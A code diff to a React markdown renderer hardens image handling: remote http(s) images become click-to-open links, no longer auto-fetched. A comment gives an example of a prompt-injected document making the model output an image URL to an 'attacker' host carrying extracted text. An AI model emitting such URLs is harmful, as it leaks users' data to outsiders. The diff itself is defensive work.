@@ -26,7 +26,10 @@ interface MarkdownProps {
 }
 
 const SAFE_LINK_SCHEMES = ["http:", "https:", "mailto:"];
-const SAFE_IMG_SCHEMES = ["https:", "http:", "asset:", "data:"];
+// http(s) is deliberately absent: model-authored markdown must never auto-fetch
+// a remote URL. A prompt-injected document could make the model emit
+// ![x](https://attacker/?d=<extracted text>) and exfiltrate on render.
+const SAFE_IMG_SCHEMES = ["asset:", "data:"];
 
 const remarkPlugins = [remarkGfm, remarkPageRefs];
 const markdownComponents = {
@@ -76,13 +79,29 @@ function SafeAnchor({
 
 function SafeImg({
   src,
+  alt,
   node: _node,
   ...rest
 }: ImgHTMLAttributes<HTMLImageElement> & { node?: unknown }) {
   const target = typeof src === "string" ? src : "";
   const scheme = schemeOf(target);
+  // Remote images render as a click-to-open link instead of auto-fetching
+  // (fetching would leak whatever the URL encodes without any user action).
+  if (scheme === "https:" || scheme === "http:") {
+    return (
+      <a
+        href={target}
+        onClick={(e) => {
+          e.preventDefault();
+          void openUrl(target);
+        }}
+      >
+        {alt?.trim() || target}
+      </a>
+    );
+  }
   if (!scheme || !SAFE_IMG_SCHEMES.includes(scheme)) return null;
-  return <img {...rest} src={target} referrerPolicy="no-referrer" loading="lazy" />;
+  return <img {...rest} alt={alt} src={target} referrerPolicy="no-referrer" loading="lazy" />;
 }
 
 /**
